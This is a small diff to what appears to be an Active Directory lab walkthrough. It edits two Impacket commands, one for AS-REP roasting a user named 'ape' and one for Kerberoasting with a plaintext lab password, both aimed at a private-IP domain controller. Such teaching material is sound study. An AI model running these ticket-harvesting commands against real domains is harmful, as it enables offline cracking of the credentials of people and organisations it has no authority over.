@@ -43,7 +43,7 @@ To perform this attack, pre-authentication was disabled for ‘ape’ user as ca
 After this, TGT ticket was requested from ‘hecker’ machine for ape user with the command below.
 
 ```bash
-impacket-GetNPUsers APEWITHINTERNET.local/ape -dc-ip=192.168.190.130 -no-pass
+GetNPUsers.py APEWITHINTERNET.local/ape -dc-ip=192.168.190.130 -no-pass
 ```
 
 ```bash
@@ -110,7 +110,7 @@ If attacker gain acces of any domain user, they can request for Service Ticket. 
 For the walkthrough, the ‘ape’ user is considered already compromised. From ‘hecker’ machine using the ape user, Service Ticket was requested with the command below.  
 
 ```bash
-sudo GetUserSPNs.py APEWITHINTERNET.local/ape:not@pe@123 -dc-ip 192.168.190.130 -request
+GetUserSPNs.py APEWITHINTERNET.local/ape:not@pe@123 -dc-ip 192.168.190.130 -request
 ```
 
 ```bash
